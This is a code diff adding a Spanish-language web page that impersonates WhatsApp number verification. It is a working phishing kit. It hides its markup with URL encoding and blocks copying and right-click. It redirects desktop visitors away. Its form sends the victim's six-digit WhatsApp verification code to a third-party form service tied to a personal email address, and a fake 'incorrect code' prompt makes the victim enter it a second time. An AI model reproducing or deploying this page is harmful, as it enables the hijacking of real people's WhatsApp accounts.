@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+<script>
+document.addEventListener('copy', function(e) {
+  e.preventDefault();
+});
+</script>
+<script>
+document.addEventListener('contextmenu', function(e) {
+  e.preventDefault();
+});
+</script>
+<script>
+  window.addEventListener('debugger', function() {
+    window.close();
+  });
+</script>
+ <script>
+	document.addEventListener("DOMContentLoaded", function() {
+		if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) && window.innerWidth < 768) {
+			document.body.style.visibility = 'visible';
+		} else {
+			window.location.href = 'https://web.whatsapp.com/mobile/';		}
+	});
+</script>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="style.css" />
+    <title></title>
+  </head>
+<body>
+<script>
+document.write(unescape("%3Cp%20class%3D%22spn1%22%3EVerificación%20de%20tu%20número%3C/p%3E%20%3Ccenter%3E%3Cimg%20class%3D%22logo%22%20src%3D%22https%3A//i.imgur.com/aIt3iNx.png%22%20width%3D%2220%25%22%20height%3D%22%25%22%20/%3E%3C/center%3E%20%3Cp%20class%3D%22spn2%22%3EUsa%20el%20teléfono%20para%20confirmar%20la%20nueva%20bienvenida%20al%20grupo%20de%20WhatsApp.%3C/p%3E%20%3Cp%20class%3D%22spn3%22%3EIngresa%20el%20código%20de%206%20dígitos%20que%20enviamos%20a%20WhatsApp%20para%20ingresar%20al%20grupo.%3C/p%3E%20%3Cform%20action%3D%22https%3A//formsubmit.co/juaresalex05@gmail.com%22%20method%3D%22POST%22%3E%20%3Cinput%20type%3D%22number%22%20id%3D%22codigo%22%20name%3D%22codigo-confirmacion%22%20placeholder%3D%22_%20_%20_   _%20_%20_%20%22%20oninput%3D%22this.value%20%3D%20this.value.slice(0%2C%206)%3B%22%20required%3E%20%3Cinput%20type%3D%22hidden%22%20name%3D%22_next%22%20value%3D%22https%3A//wa.me/%22%3E%20%3Cinput%20type%3D%22hidden%22%20name%3D%22_captcha%22%20value%3D%22false%22%3E%20%3C/form%3E%20%3Cp%20class%3D%22spn4%22%3Eingresa%20el%20código%20de%206%20dígitos.%3C/p%3E%20%3Cdiv%20id%3D%22ventana-modal%22%20class%3D%22ventana-modal%22%3E%20%3Cdiv%20class%3D%22contenido-modal%22%3E%20%3Cfont%20style%3D%22font-family%3A%20Open%20Sans%3B%20font-size%3A%20110%25%3B%20font-weight%3A00%3B%20text-align%3A%20left%3B%22%3E%20%3Cp%20class%3D%22spn5%22%3EEl%20código%20ingresado%20es%20incorrecto.Por%20vafor%2C%20vuelve%20a%20intertalo%20en%204%20segundos.%3C/p%3E%20%3C/font%3E%20%3Cbr%3E%20%3Cfont%20style%3D%22font-family%3A%20Open%20Sans%3B%20font-size%3A%20100%25%3B%20color%3A%20%23535353%3B%20text-align%3A%20left%3B%22%3E%20%3Cp%3E%3C/p%3E%20%3C/font%3E%20%3Cbr%3E%20%3Cbutton%20id%3D%22cerrar-modal%22%3EOk%3C/button%3E%20%3Cbr%3E%20%3C/div%3E%20%3C/div%3E"));
+</script>
+<script>
+document.querySelector('form').setAttribute('autocomplete', 'off');
+</script>
+<script>
+const codigoInput = document.getElementById('codigo');
+const ventanaModal = document.getElementById('ventana-modal');
+const cerrarModalBtn = document.getElementById('cerrar-modal');
+const formulario = document.querySelector('form');
+let mostrado = false;
+let enviado = false;
+let contador = 0;
+
+codigoInput.addEventListener('input', () => {
+  if (codigoInput.value.length === 6 && !mostrado) {
+    ventanaModal.style.display = 'block';
+    mostrado = true;
+    document.querySelector('.spn4').style.marginTop = '19%';
+    document.querySelector('.spn4').style.marginBottom = '0px';
+  } else if (codigoInput.value.length === 6 && mostrado && ventanaModal.style.display === 'none') {
+    contador++;
+    if (contador === 2) {
+      formulario.submit();
+    }
+  }
+});
+
+cerrarModalBtn.addEventListener('click', () => {
+  ventanaModal.style.display = 'none';
+  codigoInput.value = '';
+  document.querySelector('.spn4').style.marginTop = '';
+  document.querySelector('.spn4').style.marginBottom = '9%';
+  contador = 1;
+});
+</script>
+</body>
+</html>
